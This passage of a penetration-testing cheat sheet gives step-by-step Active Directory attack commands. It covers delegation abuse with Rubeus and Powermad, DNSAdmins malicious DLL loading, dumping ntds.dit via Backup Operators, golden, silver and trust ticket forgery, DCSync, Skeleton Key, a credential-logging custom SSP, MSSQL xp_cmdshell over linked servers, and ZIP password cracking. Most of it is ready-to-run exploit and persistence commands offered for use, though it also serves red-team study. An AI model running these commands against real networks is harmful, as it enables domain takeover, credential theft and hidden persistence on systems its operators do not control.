_WUT IS DIS?: \
TL;DR \
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._

Tools we are going to use:

- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Rubeus](https://github.com/GhostPack/Rubeus)

First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

Exploitation Example:

```powershell
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

Detailed Articles:

- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

```powershell
#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
```

Detailed Article:
[Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

### DNSAdmins Abuse

_WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._

1. Enumerate the members of the DNSAdmins group:
   - PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
   - AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2. Once we found a member of this group we need to compromise it (There are many ways).
3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:

   ```powershell
   #Using dnscmd:
   dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

   #Restart the DNS Service:
   sc \\DNSServer stop dns
   sc \\DNSServer start dns
   ```

### Abusing Active Directory-Integraded DNS

- [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
- [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Abusing Backup Operators Group

_WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._

1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

   ```powershell
   #Create a .txt file that will contain the shadow copy process script
   Script ->{
   set context persistent nowriters
   set metadata c:\windows\system32\spool\drivers\color\example.cab
   set verbose on
   begin backup
   add volume c: alias mydrive

   create

   expose %mydrive% w:
   end backup
   }

   #Execute diskshadow with our script as parameter
   diskshadow /s script.txt
   ```

2. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
   going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:

   ```powershell
   #Importing both dlls from the repo using powershell
   Import-Module .\SeBackupPrivilegeCmdLets.dll
   Import-Module .\SeBackupPrivilegeUtils.dll

   #Checking if the SeBackupPrivilege is enabled
   Get-SeBackupPrivilege

   #If it isn't we enable it
   Set-SeBackupPrivilege

   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

   #Dump the SYSTEM hive
   reg save HKLM\SYSTEM c:\temp\system.hive
   ```

3. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
4. Use secretsdump.py from impacket and dump the hashes.
5. Use psexec or another tool of your choice to PTH and get Domain Admin access.

### Abusing Exchange

- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

### Weaponizing Printer Bug

- [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
- [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

### Abusing ACLs

- [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [aclpwn.py](https://github.com/fox-it/aclpwn.py)
- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

### Abusing IPv6 with mitm6

- [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [mitm6](https://github.com/fox-it/mitm6)

### SID History Abuse

_WUT IS DIS?: If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._

Exploitation example:

```powershell
#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

Detailed Articles:

- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
- [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

### Exploiting SharePoint

- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \
  [PoC](https://github.com/k8gege/CVE-2019-0604)
- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization
- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \
  [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

### Zerologon

- [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/whitepapers/zerologon-whitepaper): White paper of the vulnerability.
- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.
- [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): PowerShell implementation of the Zerologon exploit.
- [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.

### PrintNightmare

- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Vulnerability details.
- [Impacket implementation of PrintNightmare](https://github.com/cube0x0/CVE-2021-1675): Reliable PoC of PrintNightmare using the impacket library.
- [C# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C#.

### Active Directory Certificate Services

**Check for Vulnerable Certificate Templates with:** [Certify](https://github.com/GhostPack/Certify)

_Note: Certify can be executed with Cobalt Strike's `execute-assembly` command as well_

```powershell
.\Certify.exe find /vulnerable /quiet
```

Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights
allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.

This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA")
and use the captured certificate with Rubeus to forge authentication.

_Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target._

Request the DA's Account Certificate with Certify

```powershell
.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
```

This should return a valid certificate for the associated DA account.

The exported `cert.pem` and `cert.key` files must be consolidated into a single `cert.pem` file, with one gap of whitespace between the `END RSA PRIVATE KEY` and the `BEGIN CERTIFICATE`.

_Example of `cert.pem`:_

```
-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
[...]
[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
[...]
[...]
-----END CERTIFICATE-----
```

#Utilize `openssl` to Convert to PKCS #12 Format

The `openssl` command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Once the `cert.pfx` file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, `certutil.exe`, Cobalt Strike's upload functionality, etc.)

After the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.

```powershell
.\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
```

This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.

### No PAC

- [sAMAccountname Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [Weaponisation of CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [noPAC](https://github.com/cube0x0/noPac) C# tool to exploit CVE-2021-42278 and CVE-2021-42287
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287
- [noPac](https://github.com/Ridter/noPac) Evolution of "sam-the-admin" tool

## Domain Persistence

### Golden Ticket Attack

```powershell
#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCsync Attack

```powershell
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

**Tip:** \
 /ptt -> inject ticket on current running session \
 /ticket -> save the ticket on the system for later use

### Silver Ticket Attack

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

[SPN List](https://adsecurity.org/?page_id=183)

### Skeleton Key Attack

```powershell
#Exploitation Command runned as DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

#Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### DSRM Abuse

_WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_

```powershell
#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>

#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

Then just PTH to get local admin access on DC!

### Custom SSP

_WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_

From powershell:

```powershell
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'
```

Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log

## Cross Forest Attacks

### Trust Tickets

_WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT._

:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!

- Using Mimikatz:

  ```powershell
  #Dump the trust key
  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  #Forge an inter-realm TGT using the Golden Ticket attack
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
  <OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
  <PathToSaveTheGoldenTicket>"'
  ```

  :exclamation: Tickets -> .kirbi format

  Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!

- Using Rubeus:

  ```powershell
  .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
  ```

### Abuse MSSQL Servers

- Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
- Check Accessibility as current user:

  ```powershell
  Get-SQLConnectionTestThreaded
  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
  ```

- Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
- Abusing SQL Database Links: \
  _WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!_

Check for existing Database Links:

```powershell
#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instance <SPN> -Verbose

#MSSQL Query:
select * from master..sysservers
```

Then we can use queries to enumerate other links from the linked Database:

```powershell
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

Query execution:

```powershell
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Breaking Forest Trusts

_WUT IS DIS?: \
TL;DR \
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest._

Tools we are going to use:

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

Exploitation example:

```powershell
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all
```

Detailed Articles:

- [Not A Security Boundary: Breaking Forest Trusts](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

### AD Mindmap 
[MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)









## ZIP

```
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip

zip2john file.zip > zip.john
john --wordlist=<PASSWORDS_LIST> zip.john
```
